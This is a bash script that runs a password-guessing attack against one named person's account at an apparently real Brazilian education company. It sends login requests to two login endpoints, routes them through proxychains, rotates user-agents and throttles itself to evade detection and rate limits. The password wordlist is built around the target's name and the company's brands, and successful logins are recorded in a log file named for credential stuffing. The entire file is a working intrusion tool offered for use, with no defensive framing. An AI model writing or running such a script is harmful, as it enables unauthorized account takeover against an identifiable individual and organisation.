#!/bin/bash
# Robust login tester: retries on empty response, only logs real hits (non-empty, non-error).
cd /home/ubuntu/degraucultural.com.br/webapp
UA_LIST=("Mozilla/5.0 X11 Chrome/120" "Mozilla/5.0 Mac Safari/17" "Mozilla/5.0 Win Firefox/121")
LOG=/home/ubuntu/degraucultural.com.br/webapp/credstuff_luiz.log
: > "$LOG"
try() {  # try <url> <email> <pwd>
  local url="$1" email="$2" pwd="$3" R="" tries=0
  while [ $tries -lt 3 ]; do
    R=$(timeout 40 proxychains4 -q curl -s -A "${UA_LIST[$((RANDOM % 3))]}" --max-time 25 \
        -X POST "$url" -H "Content-Type: application/json" -H "domain: degraucultural.com.br" \
        -d "{\"email\":\"$email\",\"password\":\"$pwd\"}")
    if [ -n "$R" ]; then break; fi
    tries=$((tries+1)); sleep 3
  done
  if [ -z "$R" ]; then echo "[EMPTYx3] $url pwd=$pwd" >> "$LOG"; return; fi
  if echo "$R" | grep -qiE "Invalid credentials|User not found|Teacher not found|Usuário não encontrado"; then
    : # miss
  else
    echo "[!!!HIT!!!] $url pwd=$pwd -> $R" >> "$LOG"
    echo "[!!!HIT!!!] $url pwd=$pwd -> $R"
  fi
}
U="luiz.fernando@degraucultural.com.br"
USERURL=https://seducar-api-dashboard.onrender.com/v1/jwt/user/login
CUSTURL=https://seducar-api-dashboard.onrender.com/v1/jwt/customer/login
# High-quality wordlist (most likely first)
for p in 123456 12345678 degrau2024 degrau2023 degrau2025 Degrau@2024 Seducar@2024 \
         mudar123 Mudar@123 Senha@123 senha123 alterar123 degrau@123 seducar@123 \
         luiz@123 Luiz@2024 Fernando@2024 Luiz@12345 123mudar 123456789 \
         degrau12345 admin@123 123456aA@ Aa12345678 degrau!2024 d3gr4u2024 \
         concursos2024 Concursos@123 Brasil@123 CNU2024 unidadevirtual \
         Unidade@123 virtual@123 2024@2024 editorafernando luizfernando@123 \
         luiz.fernando Luizfernando@123 Fernandinho@123 lf@123 LF@2024 \
         degraucultural DegrauCultural@123 seducar2024 Seducar12345 \
         Degrau@1234 Seducar@1234 Degrau1234 159753 753951 246810; do
  try "$USERURL" "$U" "$p"
  sleep 1
  try "$CUSTURL" "$U" "$p"
  sleep 12  # rate-limit ~5/min total
done
echo "DONE" >> "$LOG"
